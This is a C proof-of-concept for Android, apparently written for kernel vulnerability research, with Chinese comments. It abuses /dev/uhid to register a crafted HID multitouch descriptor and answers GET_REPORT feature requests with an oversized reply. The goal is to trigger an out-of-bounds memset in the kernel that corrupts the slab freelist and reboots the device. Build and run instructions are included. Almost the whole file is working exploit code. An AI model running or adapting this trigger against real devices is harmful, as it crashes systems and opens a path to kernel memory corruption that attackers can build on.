/* dev_oob.c — 真机版 OOB memset 触发探针 (与 QEMU 已验证的 qemu_init.c 同协议同描述符)
 * 用法: adb push dev_oob /data/local/tmp/ && chmod 755 && ./dev_oob > /data/local/tmp/oob.log 2>&1
 * 判据: 若 memset 在真机触发, freelist 破坏会在数轮内导致设备重启 (QEMU 实测 1 轮即崩)
 * 编译: aarch64-linux-android35-clang -static -O2 -o dev_oob dev_oob.c
 */
#define _GNU_SOURCE
#include <stdint.h>
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <unistd.h>
#include <fcntl.h>
#include <errno.h>
#include <time.h>
#include <sys/select.h>
#include <linux/uhid.h>

static int ufd = -1;
static unsigned char evbuf[sizeof(struct uhid_event)];

static void write_ev(int type, uint32_t cookie, int oob) {
    struct uhid_event *ev = (struct uhid_event *)evbuf;
    memset(ev, 0, sizeof(*ev));
    ev->type = type;
    if (type == UHID_FEATURE_ANSWER) {
        ev->u.feature_answer.id = cookie;
        ev->u.feature_answer.err = 0;
        ev->u.feature_answer.size = oob ? 128 : 1;
        ev->u.feature_answer.data[0] = oob ? 3 : 0;
    }
    write(ufd, ev, sizeof(*ev));
}

static unsigned char desc[4096];
static unsigned desc_len;

/* rep3_count = report3 的字节数(95 字段), 决定 memset 长度 w24 ≈ rep3_count-1 */
static void build_desc(int rep3_count) {
    static const unsigned char wptp[] = {
    0x05,0x0D,0x09,0x05,0xA1,0x01,
        0x85,0x01,
        0x09,0x56,0x24,0x00,0x26,0xFF,0xFF,0x75,0x10,0x95,0x01,0x81,0x02,
        0x09,0x54,0x25,0x05,0x75,0x08,0x81,0x02,
        0x05,0x20,0x0A,0x94,0x04,0x15,0x00,0x26,0xFF,0x0F,0x35,0x00,
        0x46,0xFF,0x0F,0x65,0x12,0x75,0x0C,0x95,0x01,0x81,0x02,
        0x05,0x0D,0x09,0x22,0xA1,0x02,
            0x09,0x51,0x25,0x0F,0x75,0x04,0x95,0x01,0x81,0x02,
            0x09,0x42,0x25,0x01,0x75,0x01,0x81,0x02,
            0x09,0x47,0x81,0x02,0x95,0x05,0x81,0x03,
            0x05,0x01,0x09,0x30,0x15,0x00,0x26,0xC8,0x00,0x35,0x00,
            0x45,0x69,0x65,0x11,0x75,0x10,0x95,0x01,0x81,0x02,
            0x09,0x31,0x26,0x96,0x00,0x45,0x4B,0x81,0x02,
            0x05,0x0D,0x09,0x30,0x15,0x00,0x26,0xFF,0x0F,0x35,0x00,
            0x46,0xFF,0x0F,0x65,0x12,0x75,0x0C,0x95,0x01,0x81,0x02,
        0xC0,
        0x05,0x09,0x09,0x01,0x15,0x00,0x25,0x01,0x75,0x01,0x95,0x01,
        0x81,0x02,0x95,0x07,0x81,0x03,
        0x85,0x02,
        0x05,0x0D,0x09,0x55,0x25,0x05,0x75,0x08,0x95,0x01,0xB1,0x02,
        0x09,0x59,0x25,0x02,0xB1,0x02,
        0x85,0x40,
        0x05,0x0D,0x09,0xB0,0x15,0x01,0x25,0x03,0x35,0x6E,0x45,0xBE,
        0x65,0x12,0x75,0x02,0x95,0x01,0xB1,0x02,
        0x85,0x41,
        0x05,0x0E,0x09,0x01,0xA1,0x02,
            0x09,0x23,0x15,0x00,0x25,0x04,0x75,0x08,0x95,0x01,0xB1,0x02,
        0xC0,
    };
    static const unsigned char pad118[] = { 0x75,0x08, 0x95,0x76, 0xB1,0x03 };
    unsigned char rep3[] = { 0x85,0x03, 0x75,0x08, (unsigned char)((rep3_count>>8)&0xFF), (unsigned char)(rep3_count&0xFF), 0xB1,0x03 };
    int pos=0, i=0, insA=-1;
    while(i<(int)sizeof(wptp)-5){
        if(wptp[i]==0x09&&wptp[i+1]==0x59&&wptp[i+2]==0x25&&wptp[i+3]==0x02
           &&wptp[i+4]==0xB1&&wptp[i+5]==0x02){insA=i+6;break;}
        i++;
    }
    memcpy(desc+pos,wptp,insA); pos+=insA;
    memcpy(desc+pos,pad118,sizeof(pad118)); pos+=sizeof(pad118);
    memcpy(desc+pos,rep3,sizeof(rep3)); pos+=sizeof(rep3);
    memcpy(desc+pos,wptp+insA,sizeof(wptp)-insA); pos+=sizeof(wptp)-insA;
    desc_len = pos;
}

static double now_s(void) {
    struct timespec ts;
    clock_gettime(CLOCK_MONOTONIC, &ts);
    return ts.tv_sec + ts.tv_nsec / 1e9;
}

int main(int argc, char **argv) {
    int rounds = argc > 1 ? atoi(argv[1]) : 100;
    int rep3_count = argc > 2 ? atoi(argv[2]) : 248;
    setvbuf(stdout, NULL, _IONBF, 0);
    build_desc(rep3_count);
    printf("desc_len=%u rep3_count=%d\n", desc_len, rep3_count);

    ufd = open("/dev/uhid", O_RDWR | O_CLOEXEC);
    if (ufd < 0) { printf("open uhid: %s\n", strerror(errno)); return 1; }
    printf("uhid opened fd=%d\n", ufd);

    for (int r = 1; r <= rounds; r++) {
        struct uhid_event ev;
        memset(&ev, 0, sizeof(ev));
        ev.type = UHID_CREATE;
        strcpy((char*)ev.u.create.name, "dev_mt");
        strcpy((char*)ev.u.create.phys, "dev");
        strcpy((char*)ev.u.create.uniq, "d0");
        ev.u.create.rd_data = (void*)(uintptr_t)desc;
        ev.u.create.rd_size = desc_len;
        ev.u.create.bus = 0x0003;
        ev.u.create.vendor = 0x1234;
        ev.u.create.product = 0x5678;
        ev.u.create.version = 1;
        ev.u.create.country = 0;

        ssize_t w = write(ufd, &ev, sizeof(ev));
        printf("[%.3f] round %d: CREATE ret=%zd\n", now_s(), r, w);
        if (w <= 0) { printf("create failed: %s\n", strerror(errno)); return 1; }

        /* answer up to 3 GET_REPORTs (QEMU-proven protocol: type+1, oob for rnum=2) */
        int get_count = 0;
        for (int t = 0; t < 300 && get_count < 3; t++) {
            struct timeval tv = {0, 20000};
            fd_set rf; FD_ZERO(&rf); FD_SET(ufd, &rf);
            if (select(ufd+1, &rf, NULL, NULL, &tv) <= 0) continue;
            ssize_t rr = read(ufd, &ev, sizeof(ev));
            if (rr <= 0) continue;
            if (ev.type == UHID_START) { printf("  UHID_START\n"); continue; }
            if (ev.type == UHID_OPEN || ev.type == UHID_CLOSE) continue;
            if (ev.type == 9 || ev.type == 13) {
                uint8_t rnum = ((uint8_t*)&ev.u)[4];
                printf("  GET_REPORT rnum=%u\n", rnum);
                write_ev(10, ev.u.feature.id, rnum == 2 ? 1 : 0);
                get_count++;
            }
        }
        printf("[%.3f] round %d: answered %d GET_REPORTs\n", now_s(), r, get_count);

        /* linger so the kernel worker (memset + fallout) runs while we watch */
        for (int t = 0; t < 100; t++) {
            struct timeval tv = {0, 20000};
            fd_set rf; FD_ZERO(&rf); FD_SET(ufd, &rf);
            if (select(ufd+1, &rf, NULL, NULL, &tv) <= 0) continue;
            ssize_t rr = read(ufd, &ev, sizeof(ev));
            if (rr > 0 && (ev.type == 9 || ev.type == 13)) {
                uint8_t rnum = ((uint8_t*)&ev.u)[4];
                printf("  LATE GET_REPORT rnum=%u\n", rnum);
                write_ev(10, ev.u.feature.id, rnum == 2 ? 1 : 0);
            }
        }

        /* destroy and re-create for the next round */
        memset(&ev, 0, sizeof(ev));
        ev.type = UHID_DESTROY;
        write(ufd, &ev, sizeof(ev));
        printf("[%.3f] round %d: DESTROY done — still alive\n", now_s(), r);
        usleep(200000);
    }
    printf("=== completed %d rounds, no crash observed ===\n", rounds);
    return 0;
}
